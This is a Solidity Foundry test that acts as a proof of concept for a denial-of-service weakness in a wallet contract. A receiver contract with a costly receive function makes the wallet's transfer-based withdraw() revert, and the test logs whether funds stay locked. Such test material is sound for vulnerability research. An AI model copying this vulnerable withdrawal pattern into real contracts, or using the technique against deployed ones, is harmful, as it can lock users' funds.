// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/wallet_02_refund_nosub.sol";

contract VulnerableContract {
    uint256 public counter;

    // Purposefully expensive receive function
    receive() external payable {
        // This storage operation costs 20000 gas, 
        // exceeding the 2300 gas stipend from transfer()
        counter = 1;
    }
}

contract WalletTest is Test {
    Wallet public wallet;
    VulnerableContract public attackerContract;

    function setUp() public {
        wallet = new Wallet();
        attackerContract = new VulnerableContract();
    }

    function testWithdrawDoS() public {
        // Fund attacker contract
        vm.deal(address(attackerContract), 1 ether);
        
        // Attacker deposits to wallet
        vm.prank(address(attackerContract));
        wallet.deposit{value: 1 ether}();

        // Record pre-attack state
        console.log("--- BEFORE-Trigger State ---");
        uint256 preAttackWalletBalance = wallet.getBalance(address(attackerContract));
        uint256 preAttackAttackerBalance = address(attackerContract).balance;
        uint256 preAttackTotalWithdrawals = wallet.totalWithdrawals();
        
        console.log("Attacker wallet balance (pre):", preAttackWalletBalance);
        console.log("Attacker ETH balance (pre):", preAttackAttackerBalance);
        console.log("Wallet total withdrawals (pre):", preAttackTotalWithdrawals);
        
        console.log("--- Trigger Attack Withdraw ---");
        // Execute attack (withdraw should revert)
        vm.prank(address(attackerContract));
        vm.expectRevert();
        wallet.withdraw(1 ether);
        console.log("Withdraw operation reverted (expected)");

        // Record post-attack state
        console.log("--- AFTER-Trigger State ---");
        uint256 postAttackWalletBalance = wallet.getBalance(address(attackerContract));
        uint256 postAttackAttackerBalance = address(attackerContract).balance;
        uint256 postAttackTotalWithdrawals = wallet.totalWithdrawals();
        
        console.log("Attacker wallet balance (post):", postAttackWalletBalance);
        console.log("Attacker ETH balance (post):", postAttackAttackerBalance);
        console.log("Wallet total withdrawals (post):", postAttackTotalWithdrawals);

        // Comparison verdict
        console.log("--- Comparison Verdict ---");
        bool walletBalanceUnchanged = postAttackWalletBalance == preAttackWalletBalance;
        bool ethBalanceUnchanged = postAttackAttackerBalance == preAttackAttackerBalance;
        bool withdrawalsUnchanged = postAttackTotalWithdrawals == preAttackTotalWithdrawals;
        bool stateUnchanged = walletBalanceUnchanged && ethBalanceUnchanged && withdrawalsUnchanged;
        
        if (stateUnchanged) {
            console.log("State unchanged: DoS attack succeeded");
        } else {
            console.log("State changed: Funds may have been withdrawn");
        }

        // Final vulnerability assessment
        if (stateUnchanged) {
            console.log("Vulnerability Exists: Funds successfully locked due to DoS attack");
        } else {
            console.log("Vulnerability not Exist: Funds were not locked as expected");
        }
    }
}